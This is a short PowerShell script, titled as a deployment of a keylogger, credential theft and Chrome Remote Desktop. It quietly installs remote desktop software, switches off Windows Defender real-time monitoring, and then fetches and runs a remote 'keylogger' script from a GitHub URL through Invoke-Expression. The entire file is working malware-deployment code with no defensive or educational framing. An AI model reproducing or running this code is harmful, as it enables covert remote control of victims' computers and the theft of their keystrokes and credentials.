# Complete deployment: Keylogger + Credentials + Chrome Remote Desktop

# 1. Install Chrome Remote Desktop
Write-Output "Installing Chrome Remote Desktop..."
$msiUrl = "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi"
$msiPath = "$env:TEMP\crd.msi"

# Download with retry logic
$maxRetries = 3
$retryCount = 0
$downloadSuccess = $false

while ($retryCount -lt $maxRetries -and -not $downloadSuccess) {
    try {
        Write-Output "Download attempt $($retryCount + 1)/$maxRetries..."
        Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -UseBasicParsing -TimeoutSec 60
        $downloadSuccess = $true
        Write-Output "Download successful!"
    } catch {
        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Write-Output "Download failed, retrying in 5 seconds..."
            Start-Sleep -Seconds 5
        } else {
            Write-Output "Failed to download Chrome Remote Desktop after $maxRetries attempts. Skipping..."
        }
    }
}

if ($downloadSuccess) {
    Start-Process msiexec -ArgumentList "/i `"$msiPath`" /quiet /norestart REBOOT=ReallySuppress" -Wait -NoNewWindow
    Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
    Write-Output "Chrome Remote Desktop installed successfully!"
} else {
    Write-Output "Chrome Remote Desktop installation skipped due to download failure."
}

# Disable Windows Defender Real-time Protection (optional - for smoother operation)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# 2. Install Keylogger (download and run the main script)
Write-Output "Installing keylogger..."
$keyloggerUrl = "https://raw.githubusercontent.com/Zhuss1/main/main/install-service-fixed.ps1"
Invoke-Expression (Invoke-WebRequest -UseBasicParsing $keyloggerUrl).Content

Write-Output "Complete deployment finished!"
Write-Output "Chrome Remote Desktop: Installed"
Write-Output "Keylogger: http://localhost:8081"
